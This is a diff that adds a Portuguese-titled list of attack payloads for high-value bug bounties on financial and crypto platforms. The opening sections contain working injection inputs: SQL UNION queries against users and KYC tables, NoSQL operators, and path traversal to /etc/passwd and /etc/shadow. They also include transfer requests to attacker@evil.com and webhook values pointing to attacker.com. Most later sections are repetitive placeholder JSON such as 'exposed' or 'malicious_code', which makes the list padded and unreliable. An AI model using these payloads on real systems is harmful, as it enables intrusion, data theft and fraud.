@@ -1,0 +1,514 @@
+# 🚨 PAYLOADS PARA VULNERABILIDADES DE VALOR EXTREMO
+# Foco: $100,000 - $2,000,000 em recompensas
+
+# ========================================
+# PAYLOADS DE TRANSFERÊNCIA FINANCEIRA
+# ========================================
+
+# Bypass de Autenticação em Transferências
+{"amount": "1000000", "currency": "USD", "to_address": "test@test.com", "description": "Test transfer"}
+{"amount": "999999999", "currency": "USD", "to_address": "attacker@evil.com", "description": "Hack"}
+{"amount": "1000000", "currency": "USD", "to_address": "test@test.com", "description": "Test transfer", "auth_token": ""}
+{"amount": "1000000", "currency": "USD", "to_address": "test@test.com", "description": "Test transfer", "user_id": "null"}
+{"amount": "1000000", "currency": "USD", "to_address": "test@test.com", "description": "Test transfer", "session": ""}
+
+# Manipulação de Valores Negativos
+{"amount": "-1000000", "currency": "USD", "to_address": "test@test.com"}
+{"amount": "-999999999", "currency": "USD", "to_address": "attacker@evil.com"}
+{"amount": "-0.01", "currency": "USD", "to_address": "test@test.com"}
+{"amount": "-1", "currency": "USD", "to_address": "test@test.com"}
+
+# Manipulação de IDs de Usuário
+{"amount": "1000", "currency": "USD", "to_address": "test@test.com", "user_id": "1"}
+{"amount": "1000", "currency": "USD", "to_address": "test@test.com", "user_id": "0"}
+{"amount": "1000", "currency": "USD", "to_address": "test@test.com", "user_id": "null"}
+{"amount": "1000", "currency": "USD", "to_address": "test@test.com", "user_id": ""}
+{"amount": "1000", "currency": "USD", "to_address": "test@test.com", "user_id": "admin"}
+
+# Manipulação de Endereços
+{"amount": "1000", "currency": "USD", "to_address": "attacker@evil.com"}
+{"amount": "1000", "currency": "USD", "to_address": "admin@crypto.com"}
+{"amount": "1000", "currency": "USD", "to_address": "root@crypto.com"}
+{"amount": "1000", "currency": "USD", "to_address": "system@crypto.com"}
+
+# ========================================
+# PAYLOADS DE VAZAMENTO DE DADOS
+# ========================================
+
+# SQL Injection para Dados Sensíveis
+' OR 1=1 --
+' OR 1=1# 
+' OR 1=1/* 
+' UNION SELECT * FROM users --
+' UNION SELECT * FROM customers --
+' UNION SELECT * FROM accounts --
+' UNION SELECT * FROM kyc_data --
+' UNION SELECT * FROM personal_info --
+
+# NoSQL Injection
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+
+# Path Traversal para Dados Sensíveis
+../../../etc/passwd
+../../../etc/shadow
+../../../var/log/
+../../../home/
+../../../root/
+../../../opt/
+../../../usr/local/
+
+# ========================================
+# PAYLOADS DE BYPASS DE AUTENTICAÇÃO
+# ========================================
+
+# Bypass de Token
+{"token": ""}
+{"token": "null"}
+{"token": "undefined"}
+{"token": "admin"}
+{"token": "root"}
+{"token": "system"}
+
+# Bypass de Session
+{"session": ""}
+{"session": "null"}
+{"session": "undefined"}
+{"session": "admin"}
+{"session": "root"}
+
+# Bypass de API Key
+{"api_key": ""}
+{"api_key": "null"}
+{"api_key": "undefined"}
+{"api_key": "admin"}
+{"api_key": "test"}
+
+# ========================================
+# PAYLOADS DE BUSINESS LOGIC
+# ========================================
+
+# Rate Limiting Bypass
+{"rate_limit": "0"}
+{"rate_limit": "null"}
+{"rate_limit": "unlimited"}
+{"rate_limit": "999999999"}
+
+# Duplicate Transaction
+{"transaction_id": "duplicate_123"}
+{"transaction_id": "same_id"}
+{"transaction_id": "reused_id"}
+
+# Negative Balance
+{"balance": "-1000000"}
+{"balance": "-999999999"}
+{"balance": "-0.01"}
+
+# ========================================
+# PAYLOADS DE SMART CONTRACTS
+# ========================================
+
+# Reentrancy Attack
+{"function": "withdraw", "amount": "1000000"}
+{"function": "transfer", "amount": "1000000"}
+{"function": "send", "amount": "1000000"}
+
+# Overflow Attack
+{"amount": "115792089237316195423570985008687907853269984665640564039457584007913129639936"}
+{"amount": "999999999999999999999999999999999999999999999999999999999999999999999999999999"}
+
+# Access Control Bypass
+{"owner": "0x0000000000000000000000000000000000000000"}
+{"owner": "attacker_address"}
+{"owner": "null"}
+
+# ========================================
+# PAYLOADS DE MANIPULAÇÃO DE PREÇOS
+# ========================================
+
+# Price Manipulation
+{"price": "0"}
+{"price": "-1000000"}
+{"price": "999999999999999999999999999999999999999999999999999999999999999999999999999999"}
+{"price": "null"}
+
+# Market Manipulation
+{"market": "manipulated"}
+{"market": "fake"}
+{"market": "test"}
+
+# ========================================
+# PAYLOADS DE KYC/AML BYPASS
+# ========================================
+
+# KYC Bypass
+{"kyc_status": "approved"}
+{"kyc_status": "verified"}
+{"kyc_status": "completed"}
+{"kyc_status": "true"}
+
+# AML Bypass
+{"aml_status": "passed"}
+{"aml_status": "approved"}
+{"aml_status": "verified"}
+
+# ========================================
+# PAYLOADS DE PRIVILEGE ESCALATION
+# ========================================
+
+# Role Manipulation
+{"role": "admin"}
+{"role": "root"}
+{"role": "superuser"}
+{"role": "master"}
+{"role": "owner"}
+
+# Permission Bypass
+{"permissions": "all"}
+{"permissions": "admin"}
+{"permissions": "root"}
+{"permissions": "unlimited"}
+
+# ========================================
+# PAYLOADS DE DADOS SENSÍVEIS
+# ========================================
+
+# Exposição de Chaves Privadas
+{"private_key": "exposed"}
+{"secret_key": "exposed"}
+{"api_secret": "exposed"}
+
+# Exposição de Dados PII
+{"ssn": "123-45-6789"}
+{"credit_card": "4111111111111111"}
+{"passport": "A12345678"}
+
+# ========================================
+# PAYLOADS DE INFRAESTRUTURA
+# ========================================
+
+# Server Information Disclosure
+{"debug": "true"}
+{"verbose": "true"}
+{"trace": "true"}
+{"log": "true"}
+
+# Database Access
+{"database": "exposed"}
+{"db": "exposed"}
+{"sql": "exposed"}
+
+# ========================================
+# PAYLOADS DE BACKUP/RESTORE
+# ========================================
+
+# Backup Access
+{"backup": "exposed"}
+{"restore": "exposed"}
+{"export": "exposed"}
+{"import": "exposed"}
+
+# ========================================
+# PAYLOADS DE MONITORAMENTO
+# ========================================
+
+# Log Access
+{"logs": "exposed"}
+{"monitor": "exposed"}
+{"metrics": "exposed"}
+{"stats": "exposed"}
+
+# ========================================
+# PAYLOADS DE NOTIFICAÇÃO
+# ========================================
+
+# Webhook Manipulation
+{"webhook": "attacker.com"}
+{"callback": "attacker.com"}
+{"notification": "attacker.com"}
+
+# ========================================
+# PAYLOADS DE INTEGRAÇÃO
+# ========================================
+
+# Third Party Integration
+{"integration": "attacker.com"}
+{"partner": "attacker.com"}
+{"vendor": "attacker.com"}
+
+# ========================================
+# PAYLOADS DE CACHE
+# ========================================
+
+# Cache Poisoning
+{"cache": "poisoned"}
+{"redis": "exposed"}
+{"memcached": "exposed"}
+
+# ========================================
+# PAYLOADS DE UPLOAD/DOWNLOAD
+# ========================================
+
+# File Upload
+{"file": "malicious.php"}
+{"file": "malicious.js"}
+{"file": "malicious.html"}
+
+# File Download
+{"download": "sensitive_file"}
+{"export": "sensitive_data"}
+{"backup": "sensitive_backup"}
+
+# ========================================
+# PAYLOADS DE PROCESSAMENTO
+# ========================================
+
+# Code Injection
+{"code": "malicious_code"}
+{"script": "malicious_script"}
+{"function": "malicious_function"}
+
+# ========================================
+# PAYLOADS DE EVENTOS
+# ========================================
+
+# Event Manipulation
+{"event": "malicious_event"}
+{"trigger": "malicious_trigger"}
+{"signal": "malicious_signal"}
+
+# ========================================
+# PAYLOADS DE STREAMING
+# ========================================
+
+# Stream Manipulation
+{"stream": "malicious_stream"}
+{"realtime": "malicious_realtime"}
+{"live": "malicious_live"}
+
+# ========================================
+# PAYLOADS DE VERSIONAMENTO
+# ========================================
+
+# Version Manipulation
+{"version": "vulnerable_version"}
+{"api_version": "vulnerable_api"}
+{"endpoint_version": "vulnerable_endpoint"}
+
+# ========================================
+# PAYLOADS DE DEPRECAÇÃO
+# ========================================
+
+# Legacy Endpoint Access
+{"legacy": "exposed"}
+{"deprecated": "exposed"}
+{"old": "exposed"}
+
+# ========================================
+# PAYLOADS DE TESTE
+# ========================================
+
+# Test Environment Access
+{"test": "exposed"}
+{"debug": "exposed"}
+{"sandbox": "exposed"}
+
+# ========================================
+# PAYLOADS DE STAGING
+# ========================================
+
+# Staging Environment Access
+{"staging": "exposed"}
+{"preprod": "exposed"}
+{"uat": "exposed"}
+
+# ========================================
+# PAYLOADS DE PRODUÇÃO
+# ========================================
+
+# Production Environment Access
+{"prod": "exposed"}
+{"production": "exposed"}
+{"live": "exposed"}
+
+# ========================================
+# PAYLOADS DE BACKUP
+# ========================================
+
+# Backup Environment Access
+{"backup": "exposed"}
+{"secondary": "exposed"}
+{"replica": "exposed"}
+
+# ========================================
+# PAYLOADS DE MONITORAMENTO
+# ========================================
+
+# Monitoring Access
+{"monitor": "exposed"}
+{"watch": "exposed"}
+{"observe": "exposed"}
+
+# ========================================
+# PAYLOADS DE ANÁLISE
+# ========================================
+
+# Analytics Access
+{"analytics": "exposed"}
+{"analysis": "exposed"}
+{"insight": "exposed"}
+
+# ========================================
+# PAYLOADS DE DADOS
+# ========================================
+
+# Data Access
+{"data": "exposed"}
+{"dataset": "exposed"}
+{"information": "exposed"}
+
+# ========================================
+# PAYLOADS DE COMUNICAÇÃO
+# ========================================
+
+# Communication Access
+{"communication": "exposed"}
+{"message": "exposed"}
+{"notification": "exposed"}
+
+# ========================================
+# PAYLOADS DE INTEGRAÇÃO EXTERNA
+# ========================================
+
+# External Integration Access
+{"external": "exposed"}
+{"thirdparty": "exposed"}
+{"vendor": "exposed"}
+
+# ========================================
+# PAYLOADS DE MICROSERVIÇOS
+# ========================================
+
+# Microservice Access
+{"microservice": "exposed"}
+{"service": "exposed"}
+{"gateway": "exposed"}
+
+# ========================================
+# PAYLOADS DE CACHE
+# ========================================
+
+# Cache Access
+{"cache": "exposed"}
+{"redis": "exposed"}
+{"memcached": "exposed"}
+
+# ========================================
+# PAYLOADS DE BANCO DE DADOS
+# ========================================
+
+# Database Access
+{"database": "exposed"}
+{"db": "exposed"}
+{"sql": "exposed"}
+
+# ========================================
+# PAYLOADS DE BUSCA
+# ========================================
+
+# Search Access
+{"search": "exposed"}
+{"query": "exposed"}
+{"index": "exposed"}
+
+# ========================================
+# PAYLOADS DE UPLOAD/DOWNLOAD
+# ========================================
+
+# File Access
+{"upload": "exposed"}
+{"download": "exposed"}
+{"file": "exposed"}
+
+# ========================================
+# PAYLOADS DE PROCESSAMENTO
+# ========================================
+
+# Processing Access
+{"process": "exposed"}
+{"compute": "exposed"}
+{"calculation": "exposed"}
+
+# ========================================
+# PAYLOADS DE AGENDAMENTO
+# ========================================
+
+# Scheduling Access
+{"schedule": "exposed"}
+{"cron": "exposed"}
+{"job": "exposed"}
+
+# ========================================
+# PAYLOADS DE EVENTOS
+# ========================================
+
+# Event Access
+{"event": "exposed"}
+{"webhook": "exposed"}
+{"callback": "exposed"}
+
+# ========================================
+# PAYLOADS DE STREAMING
+# ========================================
+
+# Streaming Access
+{"stream": "exposed"}
+{"realtime": "exposed"}
+{"live": "exposed"}
+
+# ========================================
+# PAYLOADS DE VERSIONAMENTO
+# ========================================
+
+# Version Access
+{"version": "exposed"}
+{"v1": "exposed"}
+{"v2": "exposed"}
+
+# ========================================
+# PAYLOADS DE DEPRECAÇÃO
+# ========================================
+
+# Deprecated Access
+{"legacy": "exposed"}
+{"old": "exposed"}
+{"deprecated": "exposed"}
+
+# ========================================
+# PAYLOADS DE TESTE
+# ========================================
+
+# Test Access
+{"test": "exposed"}
+{"testing": "exposed"}
+{"debug": "exposed"}
+
+# ========================================
+# PAYLOADS DE STAGING
+# ========================================
+
+# Staging Access
+{"staging": "exposed"}
+{"preprod": "exposed"}
+{"uat": "exposed"}
+
+# ========================================
+# PAYLOADS DE PRODUÇÃO
+# ========================================
+
+# Production Access
+{"prod": "exposed"}
+{"production": "exposed"}
+{"live": "exposed"}
